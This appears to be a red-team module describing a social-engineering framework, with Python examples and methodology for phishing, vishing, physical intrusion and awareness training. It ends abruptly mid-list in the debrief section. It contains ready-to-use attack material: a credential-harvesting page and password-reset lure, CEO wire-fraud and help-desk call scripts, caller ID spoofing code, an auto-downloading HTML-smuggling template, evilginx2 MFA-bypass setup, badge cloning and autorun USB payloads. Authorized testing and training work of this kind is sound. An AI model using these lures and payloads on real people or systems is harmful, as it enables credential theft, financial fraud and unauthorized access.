---
name: "social-engineering"
category: "redteam"
version: "1.0.0"
tags: ["redteam", "social-engineering", "phishing", "pretexting", "human-factors"]
---

# Social Engineering Framework

## Overview

The Social Engineering module provides structured methodology and tooling for authorized human-factor security testing. Social engineering remains the most effective initial access vector in real-world attacks — technical defenses are meaningless if an employee hands over credentials or clicks a malicious link. This module covers the full spectrum of social engineering techniques used in professional red team engagements: phishing, pretexting, vishing, physical social engineering, and information elicitation.

This module is designed for authorized red team operations where social engineering is part of the agreed scope. It includes campaign planning, infrastructure setup, payload delivery, tracking, reporting, and remediation guidance. Every interaction is logged for evidence capture and post-engagement debriefing.

Social engineering requires exceptional operational discipline. Unlike technical attacks, social engineering directly involves real people — employees, receptionists, executives. This module emphasizes ethical boundaries, authorization verification, and responsible disclosure to protect both the client's employees and the testing organization.

**Authorization is mandatory.** Social engineering activities must be explicitly authorized in the rules of engagement. Never conduct social engineering without written permission and defined boundaries.

## Core Capabilities

### 1. Campaign Planning & Pretext Development
- Target audience analysis and persona development
- Pretext creation (IT support, vendor, executive, new employee)
- Psychological principle application (authority, urgency, social proof, reciprocity)
- Campaign timeline and milestone planning
- Risk assessment and mitigation strategy

### 2. Phishing Infrastructure & Delivery
- Lookalike domain registration and configuration
- Email authentication setup (SPF, DKIM, DMARC) for legitimacy
- Phishing landing page development and hosting
- Credential harvesting and token capture
- Payload delivery mechanisms (macro documents, ISOs, LNKs, HTML smuggling)
- Email campaign management and tracking

### 3. Pretexting & Vishing
- Phone-based pretext development and scripts
- Help desk impersonation scenarios
- Vendor and partner impersonation
- Executive impersonation (CEO fraud, wire transfer requests)
- IT support social engineering (remote access, credential collection)
- VoIP infrastructure and call recording

### 4. Physical Social Engineering
- Tailgating and piggybacking techniques
- Badge cloning and RFID testing
- Physical access pretext development
- Lock bypass and physical security testing
- USB drop campaigns

### 5. Information Elicitation & OSINT
- Employee information gathering from public sources
- Social media reconnaissance and profiling
- Organizational chart and reporting structure mapping
- Technology stack and process inference from public data
- Breach database correlation for credential exposure

## Usage Examples

### Plan a Social Engineering Campaign

```python
from social_engineering import Campaign, TargetAudience, Pretext

# Define target audience
audience = TargetAudience(
    organization="ACME Corporation",
    department="finance",
    employee_count=45,
    seniority_levels=["manager", "director", "vp"],
    tech_savviness="moderate",
    known_training=["annual_security_awareness"],
    recent_events=["new_hire_orientation", "quarterly_meeting"],
)

# Develop pretext
pretext = Pretext(
    persona="IT Security Team",
    scenario="Urgent password expiration requiring immediate reset",
    urgency="high",
    authority="IT Director (John Smith)",
    psychological_principles=["authority", "urgency", "fear"],
    pretext_details={
        "department": "IT Security",
        "contact_name": "Mike Johnson",
        "reference_ticket": "SEC-2024-0089",
        "deadline": "24 hours",
        "consequence": "Account lockout",
    },
)

# Create campaign
campaign = Campaign(
    name="Q1 Security Assessment - Finance",
    authorization_doc="./auth/acme_auth_letter.pdf",
    scope="Finance department employees",
    target_audience=audience,
    pretexts=[pretext],
    objectives=[
        "Measure phishing susceptibility rate",
        "Test credential handling procedures",
        "Evaluate incident reporting behavior",
    ],
    timeline={
        "planning": "2024-01-15 to 2024-01-20",
        "infrastructure": "2024-01-20 to 2024-01-25",
        "execution": "2024-01-25 to 2024-02-01",
        "reporting": "2024-02-01 to 2024-02-05",
    },
    ethical_guidelines=[
        "No actual malware deployment",
        "Credential capture only for demonstration",
        "Immediate notification to IT upon campaign completion",
        "Full debrief with affected employees",
    ],
)
```

### Set Up Phishing Infrastructure

```python
from social_engineering import PhishingInfrastructure, Domain, EmailServer

# Register lookalike domains
domains = [
    Domain(
        name="acme-security.com",
        registrar="authorized_registrar",
        privacy_protection=True,
        auto_renew=True,
        dns_config={
            "mx": "mail.acme-security.com",
            "a": "10.0.0.100",
            "txt": "v=spf1 mx a ip4:10.0.0.100 ~all",
        },
    ),
    Domain(
        name="acme-corp.net",
        registrar="authorized_registrar",
        privacy_protection=True,
    ),
]

# Configure email server
email_server = EmailServer(
    provider="authorized_provider",
    domains=domains,
    authentication={
        "spf": True,
        "dkim": True,
        "dmarc": True,
    },
    warming_period_days=7,
    daily_send_limit=50,
    tracking_enabled=True,
)

# Set up infrastructure
infra = PhishingInfrastructure(domains=domains, email_server=email_server)
infra.deploy()
infra.verify_dns()
infra.verify_email_auth()
```

### Create and Launch Phishing Campaign

```python
from social_engineering import PhishingCampaign, PhishingEmail, LandingPage

# Design phishing email
email = PhishingEmail(
    from_name="IT Security Team",
    from_email="security@acme-security.com",
    subject="URGENT: Your Password Expires in 24 Hours",
    body="""
    Dear {first_name},

    Our security monitoring has detected that your password is set to expire 
    within 24 hours. To prevent account lockout and maintain access to company 
    systems, please verify your credentials immediately.

    Click here to verify: {phishing_url}

    If you do not verify within 24 hours, your account will be temporarily 
    locked per company policy SEC-2024-0089.

    Thank you,
    Mike Johnson
    IT Security Team
    ACME Corporation
    """,
    tracking_id="{tracking_id}",
    reply_to="support@acme-security.com",
)

# Create credential harvesting landing page
landing_page = LandingPage(
    template="corporate_login",
    branding={
        "company_name": "ACME Corporation",
        "logo_url": "https://acme.com/logo.png",
        "colors": {"primary": "#003366", "secondary": "#ffffff"},
    },
    form_action="/collect",
    capture_fields=["username", "password"],
    redirect_after="https://outlook.office365.com",
    ssl_enabled=True,
)

# Launch campaign
campaign = PhishingCampaign(campaign=campaign, email=email, landing_page=landing_page)
results = campaign.launch(
    recipients=audience.get_email_list(),
    batch_size=10,
    delay_between_batches=300,  # seconds
    tracking=True,
)
```

### Track Campaign Results and Generate Report

```python
from social_engineering import CampaignTracker, Report

# Track campaign metrics
tracker = CampaignTracker(campaign)

metrics = tracker.get_metrics()
print(f"Emails sent: {metrics.emails_sent}")
print(f"Emails delivered: {metrics.emails_delivered}")
print(f"Emails opened: {metrics.emails_opened}")
print(f"Links clicked: {metrics.links_clicked}")
print(f"Credentials submitted: {metrics.credentials_submitted}")
print(f"Reports made: {metrics.incidents_reported}")

print(f"\nOpen rate: {metrics.open_rate}%")
print(f"Click rate: {metrics.click_rate}%")
print(f"Submission rate: {metrics.submission_rate}%")
print(f"Report rate: {metrics.report_rate}%")

# Individual-level tracking
for target in metrics.targets:
    if target.clicked or target.submitted:
        print(f"\n{target.name} ({target.department}):")
        print(f"  Opened: {target.opened}")
        print(f"  Clicked: {target.clicked}")
        print(f"  Submitted: {target.submitted}")
        print(f"  Reported: {target.reported}")
        print(f"  Time to click: {target.time_to_click}s")

# Generate report
report = Report(
    campaign=campaign,
    metrics=metrics,
    executive_summary=True,
    individual_results=True,
    recommendations=True,
    remediation_plan=True,
)

report.generate(
    format="docx",
    output_path="./reports/acme_phishing_report.docx",
    include_evidence=True,
    anonymize_results=False,  # True for executive audience
)
```

### Pretexting and Vishing Campaign

```python
from social_engineering import VishingCampaign, CallScript, CallTarget

# Design call scripts
helpdesk_script = CallScript(
    name="IT Help Desk - Password Reset",
    scenario="Help desk calling about password expiration",
    opening="Hi, this is Mike from IT Security. I'm calling about your password expiration notification.",
    verification_questions=[
        "Can you confirm your employee ID?",
        "What department are you in?",
    ],
    main_request="I need to verify your identity to process the password extension.",
    handling_objections={
        "suspicious": "I understand your concern. You can call back at the main IT number to verify.",
        "busy": "I'll schedule a callback at a better time.",
        "refuse": "No problem, but your account will be locked at end of day.",
    },
    closing="Thank you for your cooperation. Your password has been extended.",
    escalation_path="Transfer to IT Manager if employee refuses",
)

# Define call targets
targets = [
    CallTarget(
        name="Jane Doe",
        phone="+1-555-0101",
        department="finance",
        role="Director",
        notes="Known to be helpful, may comply without verification",
    ),
    CallTarget(
        name="Bob Smith",
        phone="+1-555-0102",
        department="engineering",
        role="Manager",
        notes="Security-conscious, may ask for verification",
    ),
]

# Launch vishing campaign
vishing = VishingCampaign(
    campaign=campaign,
    scripts=[helpdesk_script],
    targets=targets,
    caller_id_spoofing=True,
    recording_enabled=True,
    results_tracking=True,
)

results = vishing.execute(
    call_window="10:00-16:00",
    max_calls_per_day=10,
    retry_attempts=2,
)
```

## Best Practices

### Authorization and Ethics
1. **Written authorization is non-negotiable.** Every social engineering activity must be explicitly authorized in the rules of engagement.
2. **Define clear boundaries.** What types of social engineering are permitted? Which departments? What information can be requested?
3. **Include debrief requirements.** Plan for post-campaign employee education and awareness.
4. **Respect employee dignity.** The goal is to test security posture, not embarrass individuals. Report aggregate metrics alongside individual results.

### Operational Security
1. **Use dedicated infrastructure.** Separate phishing domains, email servers, and phone systems from personal infrastructure.
2. **Minimize data collection.** Only collect what's necessary for the engagement. Destroy sensitive data after reporting.
3. **Monitor for real-world impact.** If a phishing campaign inadvertently triggers real incident response, be prepared to coordinate with the client immediately.
4. **Avoid real malware.** Use credential harvesting pages and controlled payloads, not actual malicious software.

### Campaign Design
1. **Research the target organization.** Effective pretexts reflect the organization's actual tools, vendors, and processes.
2. **Layer psychological principles.** Combine authority, urgency, and social proof for realistic campaigns.
3. **Test incrementally.** Start with low-sophistication campaigns before advancing to targeted spear-phishing.
4. **Track everything.** Every interaction should be logged with timestamps for evidence and reporting.

### Reporting
1. **Balance individual and aggregate results.** Executives need organizational metrics; security teams need individual follow-up.
2. **Provide actionable remediation.** Each finding should include specific training recommendations.
3. **Frame positively.** Employees who fall for phishing need training, not punishment. Frame results as organizational improvement opportunities.
4. **Include positive findings.** Employees who reported the phishing attempt deserve recognition.

## Related Modules

- **red-team-operations** — Full-scope adversary simulation incorporating social engineering
- **adversary-emulation** — Threat actor TTP mapping for realistic pretext development
- **offensive-osint** — Open-source intelligence gathering for target research
- **penetration-testing** — Technical testing to complement social engineering findings
- **evidence-hygiene** — Proper handling and redaction of social engineering evidence
- **report-writing** — Professional report authoring for social engineering findings

---

## Advanced Social Engineering Topics

### Psychological Principles in Social Engineering

Effective social engineering leverages well-studied psychological principles. Understanding these principles is critical for both executing realistic campaigns and training employees to recognize them.

```python
class PsychologicalPrinciples:
    """Psychological principles used in social engineering"""

    PRINCIPLES = {
        "authority": {
            "description": "People tend to comply with requests from authority figures",
            "application": [
                "Impersonate IT Director or CEO",
                "Use corporate letterhead and official-looking documents",
                "Reference specific policies or ticket numbers",
                "Use executive language and tone",
            ],
            "defense_training": [
                "Verify authority through separate communication channel",
                "No request should bypass standard procedures",
                "Executive impersonation awareness training",
            ],
        },
        "urgency": {
            "description": "Time pressure reduces careful decision-making",
            "application": [
                "Create artificial deadlines ('act within 24 hours')",
                "Claim system will be locked or data lost",
                "Reference security incidents requiring immediate action",
                "Use time-sensitive language ('immediately', 'urgent', 'now')",
            ],
            "defense_training": [
                "Recognize urgency as a red flag",
                "Take a breath before acting on urgent requests",
                "Verify urgency through official channels",
            ],
        },
        "social_proof": {
            "description": "People follow what others are doing",
            "application": [
                "Reference colleagues who have already complied",
                "Claim the request was approved by management",
                "Mention that others have already completed the action",
                "Reference company-wide initiatives",
            ],
            "defense_training": [
                "Individual responsibility for security actions",
                "Verify with colleagues before acting",
                "Don't assume others have verified",
            ],
        },
        "reciprocity": {
            "description": "People feel obligated to return favors",
            "application": [
                "Offer help before making a request",
                "Provide valuable information first",
                "Create a sense of indebtedness",
                "Build rapport before asking for sensitive information",
            ],
            "defense_training": [
                "Recognize when favors precede requests",
                "Security obligations override social obligations",
                "It's okay to decline requests even after receiving help",
            ],
        },
        "scarcity": {
            "description": "Limited availability increases perceived value",
            "application": [
                "Offer limited-time opportunities",
                "Claim exclusive access or information",
                "Reference limited availability of resources",
                "Create fear of missing out (FOMO)",
            ],
            "defense_training": [
                "Question why something is 'limited' or 'exclusive'",
                "Verify scarcity claims through official channels",
                "Don't let scarcity override security procedures",
            ],
        },
        "liking": {
            "description": "People are more likely to comply with people they like",
            "application": [
                "Build genuine rapport before making requests",
                "Find common interests or connections",
                "Be genuinely helpful and friendly",
                "Mirror the target's communication style",
            ],
            "defense_training": [
                "Professional relationships don't override security",
                "Friendly requests still require verification",
                "Trust but verify, regardless of rapport",
            ],
        },
        "commitment": {
            "description": "People stick with what they've committed to",
            "application": [
                "Get small initial commitments before larger ones",
                "Reference prior agreements or stated positions",
                "Use foot-in-the-door technique",
                "Reference written commitments or policies",
            ],
            "defense_training": [
                "Review commitments before acting",
                "It's okay to change your mind with new information",
                "Small commitments can lead to larger security risks",
            ],
        },
    }
```

### Advanced Phishing Techniques

```python
class AdvancedPhishing:
    """Advanced phishing techniques for red team campaigns"""

    def html_smuggling(self):
        """HTML smuggling attack for payload delivery"""
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Document Shared With You</title>
    <script>
    // HTML Smuggling - payload decoded client-side
    function downloadDocument() {{
        var payload = atob('{encoded_payload}');
        var blob = new Blob([payload], {{type: 'application/pdf'}});
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'Invoice_2024.pdf';
        document.body.appendChild(a);
        a.click();
        URL.revokeObjectURL(url);
    }}
    </script>
</head>
<body onload="downloadDocument()">
    <h2>Your document is ready</h2>
    <p>Click <a href="#" onclick="downloadDocument()">here</a> to download.</p>
</body>
</html>
"""
        return html_template

    def qrcode_phishing(self):
        """QR code based phishing attack"""
        qr_phish = {
            "description": "Generate QR code that points to phishing URL",
            "delivery": "Print QR codes in office areas or include in emails",
            "advantages": [
                "Bypasses email URL scanning",
                "Users scan with personal phones (less security)",
                "Physical delivery bypasses digital controls",
                "Difficult to detect and block",
            ],
            "tools": ["qrcode python library", "qr-code-generator.com"],
            "example_code": """
import qrcode
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('https://phishing-domain.com/login')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('phishing_qr.png')
""",
        }
        return qr_phish

    def evilginx2_phishing(self):
        """Advanced reverse proxy phishing with session hijacking"""
        evilginx2_config = {
            "description": "Man-in-the-middle phishing that captures session tokens",
            "capabilities": [
                "Reverse proxy to real authentication page",
                "Captures session cookies after MFA",
                "Real-time session token relay",
                "Bypasses MFA by proxying real authentication",
            ],
            "setup": """
# Install and configure evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make

# Configure
./evilginx2
config domain your-phishing-domain.com
config ipv4 <your-server-ip>

# Set up phishlet (e.g., O365)
phishlets hostname o365 login.your-phishing-domain.com
phishlets enable o365

# Create lures
lures create o365
lures get-url 0
""",
            "detection": [
                "SSL certificate anomalies",
                "Unusual proxy behavior",
                "Session token reuse from unusual IP",
                "MFA bypass without user interaction",
            ],
        }
        return evilginx2_config

    def credential_harvesting_infrastructure(self):
        """Set up credential harvesting infrastructure"""
        infrastructure = {
            "landing_pages": {
                "corporate_login": {
                    "description": "Clone of corporate login page",
                    "tools": ["SET (Social Engineering Toolkit)", "gophish", "Zphisher"],
                    "features": [
                        "Pixel-perfect clone of login page",
                        "Real-time credential capture",
                        "Automatic redirect after capture",
                        "SSL certificate for legitimacy",
                    ],
                },
                "microsoft_365": {
                    "description": "Clone of Microsoft 365 login",
                    "template": "Modern authentication page",
                    "features": [
                        "Captures username and password",
                        "Proxies MFA if enabled",
                        "Captures session cookies",
                    ],
                },
            },
            "tracking": {
                "open_tracking": "1x1 pixel image in email",
                "click_tracking": "Unique URLs per recipient",
                "credential_tracking": "Timestamp and IP logging",
                "browser_fingerprinting": "User agent, screen size, plugins",
            },
        }
        return infrastructure
```

### Vishing (Voice Phishing) Methodology

```python
class VishingMethodology:
    """Structured vishing (voice phishing) methodology"""

    def __init__(self):
        self.call_scripts = {}
        self.voip_infrastructure = None

    def design_call_script(self, scenario):
        """Design a vishing call script"""
        script = {
            "scenario": scenario["name"],
            "objective": scenario["objective"],
            "sections": {
                "opening": {
                    "purpose": "Establish identity and build trust",
                    "duration": "15-30 seconds",
                    "content": scenario.get("opening", ""),
                    "tone": "Professional, confident, slightly urgent",
                },
                "rapport_building": {
                    "purpose": "Build comfort and reduce suspicion",
                    "duration": "30-60 seconds",
                    "techniques": [
                        "Use target's name",
                        "Reference shared context (company, department)",
                        "Small talk related to pretext",
                        "Mirror their communication style",
                    ],
                },
                "main_request": {
                    "purpose": "Deliver the social engineering payload",
                    "duration": "30-60 seconds",
                    "content": scenario.get("main_request", ""),
                    "techniques": [
                        "Frame as routine or urgent",
                        "Reference authority figure",
                        "Minimize perceived risk",
                        "Provide plausible justification",
                    ],
                },
                "handling_objections": {
                    "purpose": "Respond to skepticism or refusal",
                    "scripts": {
                        "can_you_email_me": "I understand your concern. Let me verify your email and send confirmation. What's your email address?",
                        "need_to_check_with_manager": "That's fine, but this needs to be done before end of day. Can I hold while you check?",
                        "this_seems_suspicious": "I completely understand. You can call back at [official number] and ask for me by name.",
                        "not_comfortable": "No problem at all. I'll note that you prefer to handle this through the portal.",
                    },
                },
                "closing": {
                    "purpose": "End call naturally and extract information",
                    "duration": "15-30 seconds",
                    "content": scenario.get("closing", ""),
                    "techniques": [
                        "Thank them for their time",
                        "Confirm any information received",
                        "Provide next steps (if applicable)",
                        "End on positive note",
                    ],
                },
            },
        }
        return script

    def setup_voip_infrastructure(self):
        """Set up VoIP infrastructure for vishing"""
        infrastructure = {
            "voip_provider": "Twilio / SignalWire / Telnyx",
            "features": [
                "Caller ID spoofing",
                "Call recording (with consent where required)",
                "IVR (Interactive Voice Response) setup",
                "SMS verification capability",
                "Multi-line support",
            ],
            "configuration": {
                "twilio": """
from twilio.rest import Client

client = Client('ACCOUNT_SID', 'AUTH_TOKEN')

call = client.calls.create(
    to='+1-555-0123',
    from_='+1-555-0456',  # spoofed caller ID
    url='http://your-server.com/twiml',
    status_callback='http://your-server.com/status',
    record=True,
)
""",
                "call_recording": "Record all calls for evidence",
                "transcription": "Auto-transcribe calls for report",
            },
            "legal_considerations": [
                "Check local laws on call recording consent",
                "Disclose recording if required by jurisdiction",
                "Don't impersonate law enforcement or government",
                "Don't make threats or coercive statements",
                "Document authorization for all calls",
            ],
        }
        return infrastructure

    def handle_call_scenarios(self):
        """Common vishing scenarios and response handling"""
        scenarios = {
            "helpdesk_password_reset": {
                "pretext": "IT Help Desk calling about password expiration",
                "objective": "Collect current password or reset password",
                "approach": [
                    "Reference a fake ticket number",
                    "Claim urgency (account will lock)",
                    "Offer to 'help' with the process",
                    "Collect credentials through fake verification",
                ],
            },
            "vendor_verification": {
                "pretext": "Vendor calling to verify account details",
                "objective": "Collect account information or verification codes",
                "approach": [
                    "Reference existing business relationship",
                    "Claim need to update records",
                    "Ask for verification details",
                    "Exploit trust in established vendors",
                ],
            },
            "executive_impersonation": {
                "pretext": "CEO/CFO requesting urgent wire transfer",
                "objective": "Initiate unauthorized financial transaction",
                "approach": [
                    "Use authority and urgency",
                    "Claim to be in a meeting/traveling",
                    "Request immediate action",
                    "Discourage verification calls",
                ],
            },
            "new_employee": {
                "pretext": "New employee needing IT assistance",
                "objective": "Gain network access or credentials",
                "approach": [
                    "Claim to be new hire",
                    "Reference onboarding process",
                    "Ask for system access",
                    "Exploit helpfulness toward new employees",
                ],
            },
        }
        return scenarios
```

### Physical Social Engineering

```python
class PhysicalSocialEngineering:
    """Physical social engineering techniques for red team engagements"""

    def tailgating(self):
        """Tailgating and piggybacking techniques"""
        techniques = {
            "busy_entrance": {
                "description": "Follow employees through busy entrance during peak hours",
                "timing": "Morning arrival, lunch break, end of day",
                "props": [
                    "Laptop bag",
                    "Coffee cup",
                    "Box of donuts (for reception)",
                    "Employee badge (fake or obscured)",
                ],
                "approach": [
                    "Walk confidently toward entrance",
                    "Make eye contact and smile",
                    "Hold door for others (reciprocity)",
                    "Comment about the weather or parking",
                ],
            },
            "smoking_area": {
                "description": "Approach employees at smoking area",
                "timing": "Regular smoking break times",
                "approach": [
                    "Join smoking area conversations",
                    "Build rapport over multiple visits",
                    "Ask to borrow a badge 'just for a minute'",
                    "Exploit social bonding in smoking groups",
                ],
            },
            "delivery_person": {
                "description": "Impersonate delivery person",
                "props": [
                    "Uniform or vest",
                    "Clipboard",
                    "Fake package",
                    "Hand truck or dolly",
                ],
                "approach": [
                    "Walk to loading dock or back entrance",
                    "Reference fake delivery address",
                    "Ask for help locating recipient",
                    "Use distraction to gain access",
                ],
            },
        }
        return techniques

    def badge_cloning(self):
        """RFID badge cloning for physical access testing"""
        cloning_process = {
            "step_1_read": {
                "description": "Read badge data from target",
                "tools": ["Proxmark3", "ACR122U", "Flipper Zero"],
                "techniques": [
                    "Long-range reading with Proxmark3",
                    "Casual proximity read (bump or brush past)",
                    "Social engineering to 'scan' badge",
                ],
            },
            "step_2_clone": {
                "description": "Write badge data to blank card",
                "tools": ["Proxmark3", "T5577 cards", "iCLASS cards"],
                "considerations": [
                    "Match card type (125kHz vs 13.56MHz)",
                    "Some cards have encryption (need key)",
                    "Proximity vs smart cards",
                ],
            },
            "step_3_test": {
                "description": "Test cloned badge at access points",
                "approach": [
                    "Test at least attended entrance first",
                    "Have cover story ready if challenged",
                    "Note which readers accept cloned badge",
                    "Document access gained",
                ],
            },
        }
        return cloning_process

    def usb_drop(self):
        """USB drop campaign methodology"""
        campaign = {
            "preparation": {
                "description": "Prepare USB drops with payload",
                "usb_preparation": [
                    "Use branded USB drives (company logo if possible)",
                    "Label drives with enticing names ('Salary_2024', 'Confidential')",
                    "Load with autorun payload (if authorized)",
                    "Include decoy documents for legitimacy",
                ],
                "payload_options": [
                    "Macro-enabled document",
                    "HTA file with payload",
                    "LNK file pointing to network share",
                    "HTML smuggling page",
                ],
            },
            "placement": {
                "description": "Strategically place USB drops",
                "locations": [
                    "Parking lot",
                    "Smoking area",
                    "Lobby or reception",
                    "Near employee entrance",
                    "Conference rooms",
                    "Cafeteria",
                ],
                "tracking": [
                    "Unique identifier per USB drive",
                    "GPS tracking if possible",
                    "Web beacon on drive contents",
                    "Monitor for connection events",
                ],
            },
            "monitoring": {
                "description": "Track USB drop activity",
                "monitoring_points": [
                    "Network connection events (Sysmon Event 1)",
                    "DNS queries from dropped drive",
                    "HTTP callbacks to tracking server",
                    "USB device connection logs",
                ],
            },
        }
        return campaign
```

### Security Awareness Training Design

```python
class SecurityAwarenessTraining:
    """Design effective security awareness training programs"""

    def training_curriculum(self):
        """Comprehensive security awareness curriculum"""
        modules = {
            "module_1_phishing": {
                "title": "Recognizing Phishing Attacks",
                "duration": "30 minutes",
                "topics": [
                    "Email phishing indicators",
                    "URL inspection techniques",
                    "Attachment safety",
                    "Spear phishing vs mass phishing",
                    "Business email compromise",
                ],
                "exercises": [
                    "Interactive phishing email identification",
                    "URL analysis workshop",
                    "Real-world phishing case studies",
                ],
                "assessment": "Quiz with 10 phishing scenarios",
            },
            "module_2_passwords": {
                "title": "Password Security and Authentication",
                "duration": "20 minutes",
                "topics": [
                    "Strong password creation",
                    "Password manager usage",
                    "Multi-factor authentication",
                    "Password sharing risks",
                    "Credential reuse dangers",
                ],
                "exercises": [
                    "Password strength testing tool",
                    "MFA setup walkthrough",
                ],
                "assessment": "Practical password audit",
            },
            "module_3_social_engineering": {
                "title": "Social Engineering Awareness",
                "duration": "25 minutes",
                "topics": [
                    "Pretexting scenarios",
                    "Vishing awareness",
                    "Physical security",
                    "Information disclosure",
                    "Tailgating prevention",
                ],
                "exercises": [
                    "Role-playing scenarios",
                    "Physical security walkthrough",
                    "Social engineering quiz",
                ],
                "assessment": "Scenario-based evaluation",
            },
            "module_4_data_protection": {
                "title": "Data Handling and Protection",
                "duration": "20 minutes",
                "topics": [
                    "Data classification",
                    "Clean desk policy",
                    "Secure file sharing",
                    "Email encryption",
                    "Removable media policy",
                ],
                "exercises": [
                    "Data classification sorting game",
                    "Secure sharing practice",
                ],
                "assessment": "Data handling scenario test",
            },
            "module_5_incident_reporting": {
                "title": "Security Incident Reporting",
                "duration": "15 minutes",
                "topics": [
                    "What constitutes a security incident",
                    "How to report incidents",
                    "Who to contact",
                    "Preserving evidence",
                    "What NOT to do",
                ],
                "exercises": [
                    "Incident reporting drill",
                    "Contact information reference card",
                ],
                "assessment": "Incident response simulation",
            },
        }
        return modules

    def measure_effectiveness(self):
        """Measure training program effectiveness"""
        metrics = {
            "pre_training": {
                "phishing_susceptibility_rate": "Baseline measurement",
                "incident_reporting_rate": "How many report real incidents",
                "password_compliance": "Password policy adherence",
            },
            "post_training": {
                "phishing_susceptibility_rate": "After training measurement",
                "incident_reporting_rate": "Improvement in reporting",
                "password_compliance": "Policy adherence after training",
                "training_completion_rate": "Percentage completing training",
                "quiz_scores": "Average assessment scores",
            },
            "long_term": {
                "phishing_susceptibility_trend": "Monthly phishing test results",
                "incident_reporting_trend": "Monthly incident reports",
                "security_culture_score": "Annual security culture survey",
                "repeat_offender_rate": "Employees who repeatedly fail tests",
            },
        }
        return metrics

    def create_phishing_simulation(self):
        """Design phishing simulation for training"""
        simulation = {
            "campaign_types": [
                {
                    "type": "Baseline Assessment",
                    "purpose": "Measure initial susceptibility",
                    "sophistication": "Low",
                    "email_characteristics": [
                        "Generic greeting",
                        "Obvious spelling errors",
                        "Suspicious sender address",
                        "Generic corporate branding",
                    ],
                },
                {
                    "type": "Targeted Spear Phishing",
                    "purpose": "Test resistance to sophisticated attacks",
                    "sophistication": "High",
                    "email_characteristics": [
                        "Personalized greeting",
                        "No spelling errors",
                        "Lookalike domain",
                        "Contextually relevant content",
                    ],
                },
                {
                    "type": "Urgency-Based Phishing",
                    "purpose": "Test response to urgent requests",
                    "sophistication": "Medium",
                    "email_characteristics": [
                        "Time-sensitive language",
                        "Authority figure impersonation",
                        "Threatening consequences",
                        "Short deadline",
                    ],
                },
            ],
            "metrics_to_track": [
                "Email open rate",
                "Link click rate",
                "Credential submission rate",
                "Incident report rate",
                "Time to click",
                "Time to report",
            ],
            "follow_up_training": {
                "immediate": "Page shown after credential submission explaining it was a test",
                "within_24h": "Email to clicked users with educational content",
                "within_1week": "One-on-one training for repeat offenders",
                "quarterly": "Refresher training for all employees",
            },
        }
        return simulation
```

### Social Engineering Campaign Tracking

```python
class CampaignTracking:
    """Track and analyze social engineering campaigns"""

    def __init__(self, campaign):
        self.campaign = campaign
        self.interactions = []
        self.metrics = {}

    def track_email_interaction(self, email_data):
        """Track email-related interactions"""
        interaction = {
            "type": "email",
            "recipient": email_data["recipient"],
            "timestamp": email_data["timestamp"],
            "event": email_data["event"],  # sent, delivered, opened, clicked
            "metadata": {
                "user_agent": email_data.get("user_agent"),
                "ip_address": email_data.get("ip_address"),
                "geolocation": email_data.get("geolocation"),
                "device_type": email_data.get("device_type"),
            },
        }
        self.interactions.append(interaction)

    def track_credential_submission(self, submission_data):
        """Track credential submissions"""
        interaction = {
            "type": "credential_submission",
            "recipient": submission_data["recipient"],
            "timestamp": submission_data["timestamp"],
            "credentials_captured": {
                "username": submission_data.get("username"),
                "password_length": len(submission_data.get("password", "")),
                "mfa_attempted": submission_data.get("mfa_attempted", False),
            },
            "page_data": {
                "referrer": submission_data.get("referrer"),
                "time_on_page": submission_data.get("time_on_page"),
                "form_interaction": submission_data.get("form_interaction"),
            },
        }
        self.interactions.append(interaction)

    def generate_analytics(self):
        """Generate comprehensive campaign analytics"""
        analytics = {
            "engagement_metrics": {
                "total_sent": len([i for i in self.interactions if i["type"] == "email" and i["event"] == "sent"]),
                "total_delivered": len([i for i in self.interactions if i["type"] == "email" and i["event"] == "delivered"]),
                "total_opened": len([i for i in self.interactions if i["type"] == "email" and i["event"] == "opened"]),
                "total_clicked": len([i for i in self.interactions if i["type"] == "email" and i["event"] == "clicked"]),
                "total_submitted": len([i for i in self.interactions if i["type"] == "credential_submission"]),
            },
            "rates": {
                "delivery_rate": self._calculate_rate("delivered", "sent"),
                "open_rate": self._calculate_rate("opened", "delivered"),
                "click_rate": self._calculate_rate("clicked", "opened"),
                "submission_rate": self._calculate_rate("submitted", "clicked"),
            },
            "timing_analysis": {
                "average_time_to_open": self._avg_time_to_event("opened"),
                "average_time_to_click": self._avg_time_to_event("clicked"),
                "average_time_to_submit": self._avg_time_to_event("submitted"),
            },
            "demographic_breakdown": self._demographic_analysis(),
            "department_breakdown": self._department_analysis(),
        }
        return analytics

    def _calculate_rate(self, numerator_event, denominator_event):
        """Calculate rate between two events"""
        numerator = len([i for i in self.interactions if i.get("event") == numerator_event])
        denominator = len([i for i in self.interactions if i.get("event") == denominator_event])
        if denominator == 0:
            return 0
        return (numerator / denominator) * 100

    def _avg_time_to_event(self, event_type):
        """Calculate average time to specific event"""
        times = []
        for i, interaction in enumerate(self.interactions):
            if interaction.get("event") == event_type and i > 0:
                # Calculate time from send to this event
                send_time = next(
                    (j.get("timestamp") for j in self.interactions[:i]
                     if j.get("event") == "sent"),
                    None
                )
                if send_time:
                    delta = interaction["timestamp"] - send_time
                    times.append(delta.total_seconds())
        if not times:
            return None
        return sum(times) / len(times)

    def generate_report(self):
        """Generate campaign report"""
        analytics = self.generate_analytics()
        report = {
            "campaign_summary": self.campaign,
            "analytics": analytics,
            "key_findings": self._extract_findings(analytics),
            "recommendations": self._generate_recommendations(analytics),
            "individual_results": self._individual_results(),
            "department_comparison": self._department_comparison(),
        }
        return report

    def _extract_findings(self, analytics):
        """Extract key findings from analytics"""
        findings = []
        if analytics["rates"]["submission_rate"] > 20:
            findings.append({
                "severity": "critical",
                "finding": "High credential submission rate",
                "detail": f"{analytics['rates']['submission_rate']:.1f}% of clicked users submitted credentials",
            })
        if analytics["rates"]["click_rate"] > 30:
            findings.append({
                "severity": "high",
                "finding": "High click rate on phishing links",
                "detail": f"{analytics['rates']['click_rate']:.1f}% of opened emails had links clicked",
            })
        return findings
```

### Debrief and Awareness Programs

```python
class DebriefProgram:
    """Post-campaign debrief and awareness improvement"""

    def employee_debrief(self, employee_data):
        """Individual debrief for employees who fell for phishing"""
        debrief = {
            "format": "Private, non-punitive conversation",
            "duration": "10-15 minutes",
            "content": [
                "Explain this was an authorized security test",
                "Show the phishing email they received",
                "Point out the indicators they missed",
                "Provide specific tips for future recognition",
                "Answer questions about security policies",
                "Document completion for compliance",
